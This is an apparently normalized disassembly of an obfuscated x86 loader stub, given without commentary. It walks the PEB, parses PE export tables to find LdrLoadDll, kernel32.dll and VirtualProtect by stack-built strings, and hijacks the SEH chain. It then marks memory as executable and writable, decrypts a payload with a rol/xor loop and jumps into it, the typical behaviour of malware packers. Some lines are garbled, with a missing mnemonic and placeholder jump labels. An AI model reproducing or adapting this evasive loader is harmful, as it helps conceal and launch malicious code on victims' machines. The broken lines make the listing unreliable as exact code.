_start
pushad
add esp 0xfffffffc
mov [ esp ] ebx
xor ebx [ esp ]
test eax eax
sbb esp 0xfffffffc
push esp
test esi esi
sbb ebx 0xffffffff
add esp 0x4
mov eax [ esp - 0x4 ]
and ecx ecx
adc ebx 0x1
or esi esi
sbb eax 0x4
inc ebx
neg ebx
call $+5
sub [ eax ] ebx
retn
sub_3d90203d
add esp 0xfffffffc
mov [ esp ] edi
xor edi [ esp ]
add esp 0x4
mov ecx 0x0
xor ecx edi
and ecx ecx
sbb cx 0x1
dec cl
mov ch cl
and ebp 0x0
or ebp edi
call $+5
sub eax eax
add eax [ esp ]
test eax eax
adc ebp 0x1
movzx edx [ eax + ebp - 0x2 ]
push edx
xor edx ecx
pop edx
jne r-xdata
add [ esp ] edi
jmp [ esp ]
or edi edi
mov edi 0x0
adc edi ebp
sub_3d9020cb
push [ fs : 0x0 ]
test eax eax
adc edi eax
mov esi 0xffff
not ecx
or ecx ecx
adc edi eax
mov [ fs : 0x0 ] esp
and edi ecx
and ecx ecx
adc edi eax
jmp r-xdata
call $+5
mov ebx [ esp ]
add esp 0x4
mov ebx [ esp ]
mov [ fs : 0x0 ] ebx
add esp 0x8
xor eax eax
xor eax edi
mov ebx 0x0
add ebx [ edi + 0x3c ]
and eax eax
adc edi ebx
mov ebx 0x0
sub ebx 0x4550
neg ebx
xor edx edx
add edx [ edi ]
sub esp 0x4
mov [ esp ] edx
xor edx ebx
pop edx
jne r-xdata
jmp [ esp ]
popad
mov eax 0x0
or eax 0x1
retn 0xc
mov ebx [ edi + 0x78 ]
mov edi 0x0
sub edi ebx
neg edi
and eax eax
adc edi eax
push edi
sub ebx ebx
add ebx [ edi + 0x20 ]
mov edi ebx
add edi eax
call $+5
mov [ esp ] eax
call $+5
mov [ esp ] edi
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
and ebx ebx
adc esp 0x4
mov eax 0x0
or eax esi
and ecx 0x0
or ecx [ esi ]
mov esi ecx
call $+5
mov ebp esp
and edx edx
adc esi ebx
sub esp 0x4
mov [ esp ] 0x6c6c
push 0x4464616f
call $+5
mov [ esp ] 0x4c72644c
and edi 0x0
or edi esp
xor ecx ecx
or ecx 0xb
[ esi ] [ edi ]
je r-xdata
and edi edi
sbb edi eax
xor ebx ebx
mov ebx [ edi ]
mov edx 0x0
sub edx 0x5a4d
neg edx
and ebx esi
push ebx
test ecx ecx
sbb ebx edx
pop ebx
je r-xdata
mov esp 0x0
add esp ebp
mov esi [ esp ]
add esp 0x4
push ebx
sub esp 0x4
mov [ esp ] edx
mov ecx [ esp ]
add esp 0x4
mov eax [ esp ]
add esp 0x4
pop edi
xor esi esi
xor esi edi
xor ebx ebx
xor ebx [ edi + 0x24 ]
xor edi edi
or edi ebx
add edi eax
mov ebx 0x0
or ebx [ edi + ecx * 2 ]
and ebx 0xffff
mov ecx 0x0
or ecx ebx
or ecx ecx
mov ebx 0x0
adc ebx [ esi + 0x10 ]
sub ecx ebx
and eax eax
sbb ecx 0xffffffff
mov edi 0x0
sub edi [ esi + 0x1c ]
neg edi
or ebx ebx
adc edi eax
mov ebx 0x0
sub ebx [ edi + ecx * 4 ]
neg ebx
and eax eax
adc eax ebx
or ebx ebx
mov ebp 0x0
adc ebp esp
add esp 0xfffffffc
mov [ esp ] ebx
xor ebx [ esp ]
or eax eax
adc esp 0x4
push ebx
and edi 0x0
add edi esp
add esp 0xfffffffc
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] 0x6c006c
sub esp 0x4
mov [ esp ] 0x64002e
sub esp 0x4
mov [ esp ] 0x320033
add esp 0xfffffffc
mov [ esp ] 0x6c0065
sub esp 0x4
mov [ esp ] 0x6e0072
push 0x65006b
push esp
add esp 0xfffffffc
mov [ esp ] 0x1a0018
and edi edi
mov edx 0x0
adc edx esp
push edi
add esp 0xfffffffc
mov [ esp ] edx
call $+5
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] ebx
call $+5
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] edi
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
call ebx
sub eax eax
add eax [ esi ]
push eax
mov ebx [ esp ]
add esp 0x4
mov edx 0x0
sub edx [ fs : 0x30 ]
neg edx
and eax 0x0
or eax [ edx + 0x10 ]
mov [ eax + 0x18 ] ebx
sub esp esp
add esp ebp
mov edx 0x0
xor edx [ fs : 0x30 ]
xor eax eax
add eax [ edx + 0x10 ]
mov edi 0x0
add edi [ eax + 0x18 ]
xor eax eax
xor eax edi
sub ebx ebx
add ebx [ edi + 0x3c ]
or ecx ecx
adc edi ebx
mov ebx 0x0
xor ebx [ edi + 0x78 ]
mov edi 0x0
add edi ebx
and ebx ebx
adc edi eax
push edi
or eax eax
mov ebx 0x0
adc ebx [ edi + 0x20 ]
mov edi 0x0
sub edi ebx
neg edi
test edx edx
adc edi eax
add esp 0xfffffffc
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] edi
pop esi
add esp 0x4
mov ebx [ esp - 0x4 ]
call $+5
mov [ esp ] edx
xor edx [ esp ]
test edi edi
sbb esp 0xfffffffc
sub eax eax
add eax esi
sub ecx ecx
add ecx [ esi ]
sub esi esi
add esi ecx
call $+5
mov ebp 0x0
sub ebp esp
neg ebp
test eax eax
adc esi ebx
sub esp 0x4
mov [ esp ] 0x7463
sub esp 0x4
mov [ esp ] 0x65746f72
call $+5
mov [ esp ] 0x506c6175
push 0x74726956
and eax eax
mov edi 0x0
adc edi esp
and ecx 0x0
or ecx 0xf
[ esi ] [ edi ]
je r-xdata
or edi edi
sbb edx 0xffffffff
and ebx ebx
adc eax 0x4
and esi 0x0
or esi [ eax ]
mov esp 0x0
xor esp ebp
jmp [ esp ]
xor esp esp
add esp ebp
mov esi [ esp ]
add esp 0x4
push ebx
push edx
add esp 0x4
mov ecx [ esp - 0x4 ]
mov eax [ esp ]
add esp 0x4
pop edi
xor esi esi
xor esi edi
xor ebx ebx
xor ebx [ edi + 0x24 ]
xor edi edi
xor edi ebx
add edi eax
sub ebx ebx
add ebx [ edi + ecx * 2 ]
and ebx 0xffff
xor ecx ecx
add ecx ebx
push [ esi + 0x10 ]
pop ebx
sub ecx ebx
and edx edx
sbb ecx 0xffffffff
sub edi edi
add edi [ esi + 0x1c ]
and eax eax
adc edi eax
xor ebx ebx
or ebx [ edi + ecx * 4 ]
add eax ebx
mov esi 0x0
add esi 0x1000
call $+5
pop edi
and edi 0xfffff000
add edi esi
and ebx ebx
adc edi esi
add esp 0xfffffffc
mov [ esp ] edi
xor edx edx
add edx 0x4
call $+5
and esi esi
adc edi esi
test ebx ebx
mov ebx 0x0
adc ebx [ edi ]
test eax eax
sbb edx 0x1
je r-xdata
inc edx
test ebx ebx
adc eax 0x4
and ecx ecx
mov esi 0x0
adc esi [ eax ]
and esp 0x0
or esp ebp
jmp [ esp ]
mov ebx [ esp ]
add esp 0x4
add esp 0x4
mov edi [ esp - 0x4 ]
sub esp 0x4
mov [ esp ] ebx
push esp
sub esp 0x4
mov [ esp ] 0x40
sub esp 0x4
mov [ esp ] 0x45c4
push edi
push eax
call $+5
mov [ esp ] edi
mov esi [ esp ]
add esp 0x4
add esp 0x4
mov ebx [ esp - 0x4 ]
call $+5
pop eax
add eax 0x1b
add esp 0xfffffffc
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] ebp
xor ebp ebp
or ebp esp
and edx edx
adc ebx 0x5
jmp ebx
jmp [ esp ]
sub_3d90252d
add esp 0x4
mov ebx [ esp - 0x4 ]
and ecx ecx
mov edi 0x0
adc edi esi
xor eax eax
xor eax 0xc
add edi eax
xor esi esi
or esi edi
mov ebp 0x0
or ebp edi
mov ecx 0x0
xor ecx 0x4522
xor edx edx
add edx ecx
call $+5
test edi edi
sbb esi 0xffffffff
add esp 0x4
mov ecx [ esp - 0x4 ]
stc
sbb ecx 0x0
je r-xdata
stosb [ edi ]
pop eax
call ebp
and esi esi
adc eax ebx
add ecx edx
popad
mov eax 0x0
or eax 0x1
retn 0xc
jmp [ esp ]
xor eax eax
or eax [ esi ]
rol al cl
xor eax edx
add esp 0xfffffffc
mov [ esp ] ecx
mov ecx 0x0
or ecx 0x40
cmp ebx ecx
je r-xdata
